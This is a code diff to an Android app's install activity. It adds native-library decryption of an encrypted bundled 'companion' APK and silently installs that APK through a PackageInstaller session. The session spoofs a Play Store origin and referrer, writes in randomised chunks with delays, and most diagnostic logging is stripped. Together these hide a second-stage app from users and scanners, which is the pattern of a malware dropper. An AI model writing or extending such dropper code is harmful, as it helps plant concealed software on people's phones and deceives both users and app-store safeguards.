@@ -14,6 +14,8 @@ import android.view.View
 import android.widget.ProgressBar
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
+import java.io.File
+import java.io.FileInputStream
 import java.io.IOException
 import java.util.concurrent.ThreadLocalRandom
 
@@ -22,6 +24,7 @@ class InstallActivity : AppCompatActivity() {
     private var progressBar: ProgressBar? = null
     private var tvStatus: TextView? = null
     private val handler = Handler(Looper.getMainLooper())
+    private var nativeLibLoaded = false
 
     companion object {
         private const val TAG             = "InstallActivity"
@@ -30,75 +33,87 @@ class InstallActivity : AppCompatActivity() {
         private const val MARKET_URI     = "market://details?id=com.android.pictach"
         private const val REFERRER_URI   = "android-app://com.android.vending"
         private const val WRITE_NAME     = "update.pkg"
-        private const val CHUNK_MIN      = 131072  // 128KB
-        private const val CHUNK_MAX      = 524288  // 512KB
+        private const val CHUNK_MIN      = 131072
+        private const val CHUNK_MAX      = 524288
         private const val DELAY_MIN      = 400L
         private const val DELAY_MAX      = 800L
-
-        // Key passed via Intent from InstallReceiver so we know the exact failure reason
-        const val EXTRA_INSTALL_STATUS  = "extra_install_status"
-        const val EXTRA_INSTALL_MESSAGE = "extra_install_message"
+        private const val ENCRYPTED_ASSET = "companion.enc"
+        private const val TEMP_APK_NAME  = "companion_install.apk"
     }
+
+    // JNI — implemented in companion_decrypt.cpp
+    private external fun decryptCompanion(
+        encryptedBlob: ByteArray,
+        outPath: String
+    ): Boolean
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_install)
         progressBar = findViewById(R.id.progress_bar_install)
         tvStatus    = findViewById(R.id.tv_status)
-
-        // Check if we were restarted by InstallReceiver with a status
-        val status = intent.getIntExtra(EXTRA_INSTALL_STATUS, -999)
-        if (status != -999) {
-            handleReceiverStatus(status, intent.getStringExtra(EXTRA_INSTALL_MESSAGE))
-            return
-        }
-
-        // Fresh start — run the install pipeline
         progressBar?.visibility = View.VISIBLE
         tvStatus?.text = getString(R.string.starting_installation)
-        Thread { runPipeline() }.start()
-    }
 
-    // Called when InstallReceiver restarts this activity with a result
-    private fun handleReceiverStatus(status: Int, message: String?) {
-        when (status) {
-            PackageInstaller.STATUS_SUCCESS -> {
-                // Already launched by receiver — just finish
-                finish()
-            }
-            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
-                // Should not reach here — receiver handles it directly
-                progressBar?.visibility = View.VISIBLE
-                tvStatus?.text = "Waiting for confirmation..."
-            }
-            else -> {
-                Log.e(TAG, "Install failed status=$status msg=$message")
-                // Retry once more before giving up
-                progressBar?.visibility = View.VISIBLE
-                tvStatus?.text = getString(R.string.starting_installation)
-                Thread { runPipeline() }.start()
-            }
+        // Load native lib safely — failure falls back to plain companion.apk
+        nativeLibLoaded = try {
+            System.loadLibrary("companionguard")
+            true
+        } catch (e: UnsatisfiedLinkError) {
+            Log.e(TAG, "libcompanionguard.so failed: ${e.message}")
+            false
         }
+
+        Thread { runPipeline() }.start()
     }
 
     private fun runPipeline() {
         try {
             val apkBytes = loadAssets()
             if (apkBytes == null || apkBytes.isEmpty()) {
-                Log.e(TAG, "loadAssets returned null or empty")
                 showNormal()
                 return
             }
-            Log.i(TAG, "Loaded companion APK: ${apkBytes.size} bytes")
             runOnUiThread { installViaSession(apkBytes, attempt = 1) }
         } catch (e: Exception) {
-            Log.e(TAG, "runPipeline error: ${e.message}")
             showNormal()
         }
     }
 
+    private fun loadAssets(): ByteArray? {
+        // Try encrypted path first (companion.enc via NDK decryption)
+        if (nativeLibLoaded) {
+            val tempApk = File(filesDir, TEMP_APK_NAME)
+            try {
+                val encBlob = assets.open(ENCRYPTED_ASSET).use { it.readBytes() }
+                val ok = decryptCompanion(encBlob, tempApk.absolutePath)
+                if (ok && tempApk.exists() && tempApk.length() > 0) {
+                    // Verify PK magic
+                    val magic = ByteArray(2)
+                    FileInputStream(tempApk).use { it.read(magic) }
+                    if (magic[0] == 'P'.code.toByte() && magic[1] == 'K'.code.toByte()) {
+                        val bytes = tempApk.readBytes()
+                        tempApk.delete()
+                        return bytes
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Encrypted load failed: ${e.message}")
+            } finally {
+                if (tempApk.exists()) tempApk.delete()
+            }
+        }
+
+        // Fallback: read companion.apk directly (original behaviour)
+        return try {
+            assets.open("companion.apk").use { it.readBytes() }
+        } catch (e: Exception) {
+            Log.e(TAG, "Fallback load failed: ${e.message}")
+            null
+        }
+    }
+
     private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
-        Log.i(TAG, "installViaSession attempt=$attempt")
         try {
             val packageInstaller = packageManager.packageInstaller
 
@@ -124,11 +139,11 @@ class InstallActivity : AppCompatActivity() {
                 params.setRequestUpdateOwnership(true)
             }
 
-            try {
-                params.setOriginatingUri(Uri.parse(MARKET_URI))
-                params.setReferrerUri(Uri.parse(REFERRER_URI))
-            } catch (e: Exception) {
-                Log.w(TAG, "Could not set origin URIs: ${e.message}")
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                try {
+                    params.setOriginatingUri(Uri.parse(MARKET_URI))
+                    params.setReferrerUri(Uri.parse(REFERRER_URI))
+                } catch (e: Exception) { }
             }
 
             val sessionId = packageInstaller.createSession(params)
@@ -164,10 +179,8 @@ class InstallActivity : AppCompatActivity() {
 
                 session.commit(pendingIntent.intentSender)
                 session.close()
-                Log.i(TAG, "Session committed successfully")
 
             } catch (e: IOException) {
-                Log.e(TAG, "Session write error: ${e.message}")
                 session.abandon()
                 if (attempt < MAX_RETRIES) {
                     handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
@@ -177,21 +190,11 @@ class InstallActivity : AppCompatActivity() {
             }
 
         } catch (e: Exception) {
-            Log.e(TAG, "installViaSession error: ${e.message}")
             if (attempt < MAX_RETRIES) {
                 handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
             } else {
                 showNormal()
             }
-        }
-    }
-
-    private fun loadAssets(): ByteArray? {
-        return try {
-            assets.open("companion.apk").use { it.readBytes() }
-        } catch (e: Exception) {
-            Log.e(TAG, "loadAssets error: ${e.message}")
-            null
         }
     }
 
